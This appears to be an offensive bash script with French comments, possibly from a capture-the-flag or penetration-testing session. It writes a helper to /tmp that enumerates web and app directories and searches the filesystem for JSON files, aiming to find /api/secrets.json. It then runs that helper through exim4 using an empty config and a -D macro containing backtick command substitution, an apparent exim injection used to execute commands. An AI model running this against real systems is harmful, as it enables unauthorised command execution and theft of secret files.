#!/bin/bash

echo "[+] Exploration des répertoires pour trouver /api/secrets.json"

# Créer un script pour explorer les répertoires
cat > /tmp/explore_dirs.sh << 'EOF'
#!/bin/bash
# Lister les répertoires racine
echo "=== Répertoires racine ==="
ls -la / 2>/dev/null

# Vérifier si /api existe
echo "=== Contenu de /api (si existant) ==="
ls -la /api 2>/dev/null

# Vérifier d'autres emplacements possibles
echo "=== Contenu de /app (si existant) ==="
ls -la /app 2>/dev/null

echo "=== Contenu de /var/www (si existant) ==="
ls -la /var/www 2>/dev/null

echo "=== Contenu de /var/www/html (si existant) ==="
ls -la /var/www/html 2>/dev/null

echo "=== Contenu de /srv (si existant) ==="
ls -la /srv 2>/dev/null

# Rechercher tous les fichiers json
echo "=== Tous les fichiers JSON dans des emplacements clés ==="
find / -name "*.json" -type f 2>/dev/null | grep -v "proc\|sys\|usr\|lib" > /tmp/json_files.txt
cat /tmp/json_files.txt
EOF

chmod +x /tmp/explore_dirs.sh

echo "[+] Exécution de l'exploration..."
/usr/sbin/exim4 -C/dev/null -DEXIM_MACRO="`/tmp/explore_dirs.sh`" > /tmp/exim_output.txt 2>&1

echo "[+] Résultats de l'exploration:"
cat /tmp/exim_output.txt

echo "[+] Fichiers JSON trouvés:"
cat /tmp/json_files.txt 2>/dev/null
